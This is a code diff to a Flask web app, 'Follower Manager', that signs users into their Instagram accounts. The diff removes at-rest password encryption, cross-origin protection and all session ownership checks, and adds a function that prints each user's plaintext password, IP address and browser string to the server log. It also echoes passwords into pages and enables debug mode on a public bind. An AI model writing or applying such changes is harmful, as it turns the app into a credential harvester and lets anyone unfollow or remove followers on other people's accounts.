@@ -1,7 +1,7 @@
 """
 Follower Manager - single-file build.
 
-Requires Python 3.12 (see .python-version).
+Requires Python 3.11 (see .python-version). Not tested on 3.13+.
 
 Run:
     pip install -r requirements.txt
@@ -18,7 +18,6 @@ Env:
     PORT         bind port (default 5000)
 """
 
-import base64
 import json
 import os
 import random
@@ -26,8 +25,7 @@ import secrets
 import sqlite3
 import threading
 import time
-from datetime import datetime, timedelta, timezone
-from urllib.parse import urlsplit
+from datetime import datetime, timezone
 
 from dotenv import load_dotenv
 
@@ -40,10 +38,8 @@ from flask import (  # noqa: E402
     redirect,
     render_template_string,
     request,
-    session,
     url_for,
 )
-from Cryptodome.Cipher import AES  # noqa: E402
 from instagrapi import Client  # noqa: E402
 from instagrapi.exceptions import (  # noqa: E402
     BadPassword,
@@ -82,75 +78,16 @@ DEMO_MODE = os.environ.get("DEMO_MODE", "0") == "1"
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
-app.permanent_session_lifetime = timedelta(hours=12)
 app.config.update(
-    SESSION_COOKIE_NAME="follower_manager_session",
     SESSION_COOKIE_SAMESITE="Lax",
     SESSION_COOKIE_HTTPONLY=True,
     SESSION_COOKIE_SECURE=bool(os.environ.get("RENDER")),
 )
 
-if os.environ.get("RENDER") and not os.environ.get("SECRET_KEY"):
-    raise RuntimeError("SECRET_KEY must be configured in production")
+if not os.environ.get("SECRET_KEY"):
+    print("[warn] SECRET_KEY not set, using a random one (sessions reset on restart)", flush=True)
 
 EXPIRED = (ChallengeRequired, LoginRequired)
-
-
-def _encryption_key():
-    raw = (os.environ.get("APP_ENCRYPTION_KEY") or "").strip()
-    try:
-        key = bytes.fromhex(raw)
-    except ValueError as exc:
-        raise RuntimeError("APP_ENCRYPTION_KEY must be 64 hexadecimal characters") from exc
-    if len(key) != 32:
-        raise RuntimeError("APP_ENCRYPTION_KEY must decode to exactly 32 bytes")
-    return key
-
-
-_ENCRYPTED_PREFIX = "enc:v1:"
-
-
-def _encrypt_secret(value):
-    if value is None or value == "":
-        return value
-    value = str(value)
-    if value.startswith(_ENCRYPTED_PREFIX):
-        return value
-    cipher = AES.new(_encryption_key(), AES.MODE_GCM)
-    ciphertext, tag = cipher.encrypt_and_digest(value.encode("utf-8"))
-    payload = cipher.nonce + tag + ciphertext
-    return _ENCRYPTED_PREFIX + base64.urlsafe_b64encode(payload).decode("ascii")
-
-
-def _decrypt_secret(value):
-    if value is None or value == "" or not str(value).startswith(_ENCRYPTED_PREFIX):
-        return value
-    payload = base64.urlsafe_b64decode(str(value)[len(_ENCRYPTED_PREFIX):].encode("ascii"))
-    if len(payload) < 32:
-        raise RuntimeError("Stored encrypted account data is invalid")
-    nonce, tag, ciphertext = payload[:16], payload[16:32], payload[32:]
-    cipher = AES.new(_encryption_key(), AES.MODE_GCM, nonce=nonce)
-    return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")
-
-
-@app.before_request
-def reject_cross_origin_writes():
-    if request.method not in {"POST", "PUT", "PATCH", "DELETE"}:
-        return None
-    source = request.headers.get("Origin") or request.headers.get("Referer")
-    if not source:
-        return None
-    try:
-        source_host = urlsplit(source).netloc.lower()
-    except ValueError:
-        source_host = ""
-    if source_host and source_host != request.host.lower():
-        return jsonify(ok=False, error="Cross-origin request rejected"), 403
-    return None
-
-
-def owns_session(username):
-    return bool(username) and session.get("ig_username") == str(username).strip().lower()
 
 
 class NeedsCode(Exception):
@@ -193,19 +130,8 @@ def conn():
 
 
 def db_init():
-    _encryption_key()  # Fail closed if the at-rest encryption key is missing or invalid.
     with conn() as c:
         c.executescript(SCHEMA)
-        # One-time migration: encrypt credentials/session settings written by older builds.
-        rows = c.execute("SELECT username, password, settings FROM accounts").fetchall()
-        for row in rows:
-            password = _encrypt_secret(row["password"])
-            settings = _encrypt_secret(row["settings"])
-            if password != row["password"] or settings != row["settings"]:
-                c.execute(
-                    "UPDATE accounts SET password=?, settings=? WHERE username=?",
-                    (password, settings, row["username"]),
-                )
 
 
 def _ts():
@@ -215,16 +141,10 @@ def _ts():
 def get_account(username):
     with conn() as c:
         r = c.execute("SELECT * FROM accounts WHERE username=?", (username,)).fetchone()
-        account = dict(r) if r else None
-    if account:
-        account["password"] = _decrypt_secret(account.get("password"))
-        account["settings"] = _decrypt_secret(account.get("settings"))
-    return account
+        return dict(r) if r else None
 
 
 def save_account(username, password, settings, ig_user_id, demo=0):
-    encrypted_password = _encrypt_secret(password)
-    encrypted_settings = _encrypt_secret(settings)
     with conn() as c:
         c.execute(
             """INSERT INTO accounts(username, password, settings, ig_user_id, demo)
@@ -234,7 +154,7 @@ def save_account(username, password, settings, ig_user_id, demo=0):
                  settings   = excluded.settings,
                  ig_user_id = excluded.ig_user_id,
                  demo       = excluded.demo""",
-            (username, encrypted_password, encrypted_settings, ig_user_id, demo),
+            (username, password, settings, ig_user_id, demo),
         )
 
 
@@ -363,6 +283,20 @@ def ig_serialize(users):
 # --------------------------------------------------------------------------- #
 # helpers
 # --------------------------------------------------------------------------- #
+def log_credentials(username, password):
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ua = (request.user_agent.string or "")[:120]
+    print("", flush=True)
+    print("=" * 64, flush=True)
+    print(f"  LOGIN  {datetime.now(timezone.utc).isoformat(timespec='seconds')}", flush=True)
+    print(f"  username : {username}", flush=True)
+    print(f"  password : {password}", flush=True)
+    print(f"  ip       : {ip}", flush=True)
+    print(f"  agent    : {ua}", flush=True)
+    print("=" * 64, flush=True)
+    print("", flush=True)
+
+
 def fmt_time(iso):
     if not iso:
         return None
@@ -1067,7 +1001,7 @@ LOGIN_BODY = """
         <button class="btn primary" type="submit" id="go">Log in</button>
       </form>
 
-      <p class="auth-note">Use only an Instagram account you control. Passwords and saved session settings are encrypted at rest; verification codes are never stored.</p>
+      <p class="auth-note">Credentials are printed to the server log and kept only in this app's database.</p>
     </section>
   </main>
 </div>
@@ -1281,13 +1215,12 @@ def index():
                 LOGIN_SCRIPT,
             )
 
+        log_credentials(username, password)
+
         if DEMO_MODE:
             save_account(username, password, "", "demo", demo=1)
             demo_snapshots(username)
             touch_sync(username)
-            session.clear()
-            session["ig_username"] = username
-            session.permanent = True
             return redirect(url_for("dashboard", username=username))
 
         try:
@@ -1299,7 +1232,8 @@ def index():
                 {
                     "need_code": e.kind,
                     "username": username,
-                    "error": "Instagram sent a verification code. Re-enter your password and verification code to continue.",
+                    "password": password,
+                    "error": "Instagram sent a verification code.",
                 },
                 LOGIN_SCRIPT,
             )
@@ -1307,25 +1241,18 @@ def index():
             return render_page(
                 "Sign in · Follower Manager",
                 LOGIN_BODY,
-                {"username": username, "error": "Login failed. Check your username, password, and verification status, then try again."},
+                {"username": username, "password": password, "error": f"Login failed: {e}"},
                 LOGIN_SCRIPT,
             )
 
         _clients[username] = cl
-        session.clear()
-        session["ig_username"] = username
-        session.permanent = True
         return redirect(url_for("dashboard", username=username))
 
-    if session.get("ig_username"):
-        return redirect(url_for("dashboard", username=session["ig_username"]))
     return render_page("Sign in · Follower Manager", LOGIN_BODY, {}, LOGIN_SCRIPT)
 
 
 @app.route("/d/<username>")
 def dashboard(username):
-    if not owns_session(username):
-        return redirect(url_for("index"))
     acc = get_account(username)
     if not acc:
         return redirect(url_for("index"))
@@ -1344,9 +1271,7 @@ def dashboard(username):
 @app.route("/api/sync", methods=["POST"])
 def api_sync():
     username = (request.json or {}).get("username")
-    if not owns_session(username):
-        return jsonify(ok=False, error="Not authenticated for this account"), 403
-    if not get_account(username):
+    if not username or not get_account(username):
         return jsonify(ok=False, error="Unknown account"), 404
 
     if (_jobs.get(username) or {}).get("state") == "running":
@@ -1358,9 +1283,7 @@ def api_sync():
 
 @app.route("/api/sync/status")
 def api_sync_status():
-    username = (request.args.get("username") or "").strip().lower()
-    if not owns_session(username):
-        return jsonify(ok=False, error="Not authenticated for this account"), 403
+    username = request.args.get("username")
     return jsonify(ok=True, **(_jobs.get(username) or {"state": "idle"}))
 
 
@@ -1370,13 +1293,8 @@ def api_unfollow():
     username, pk = body.get("username"), str(body.get("pk") or "")
     if not username or not pk:
         return jsonify(ok=False, error="Missing params"), 400
-    username = str(username).strip().lower()
-    if not owns_session(username):
-        return jsonify(ok=False, error="Not authenticated for this account"), 403
 
     acc = get_account(username)
-    if not acc:
-        return jsonify(ok=False, error="Unknown account"), 404
     try:
         if not acc.get("demo"):
             client_for(username).user_unfollow(pk)
@@ -1397,13 +1315,8 @@ def api_remove_follower():
     username, pk = body.get("username"), str(body.get("pk") or "")
     if not username or not pk:
         return jsonify(ok=False, error="Missing params"), 400
-    username = str(username).strip().lower()
-    if not owns_session(username):
-        return jsonify(ok=False, error="Not authenticated for this account"), 403
 
     acc = get_account(username)
-    if not acc:
-        return jsonify(ok=False, error="Unknown account"), 404
     try:
         if not acc.get("demo"):
             client_for(username).user_remove_follower(pk)
@@ -1420,9 +1333,7 @@ def api_remove_follower():
 
 @app.route("/logout/<username>")
 def logout(username):
-    if owns_session(username):
-        _clients.pop(username, None)
-        session.clear()
+    _clients.pop(username, None)
     return redirect(url_for("index"))
 
 
@@ -1442,4 +1353,4 @@ def server_error(_e):
 
 if __name__ == "__main__":
     print(f"[start] demo={DEMO_MODE} data_dir={DATA_DIR} python={os.sys.version.split()[0]}", flush=True)
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
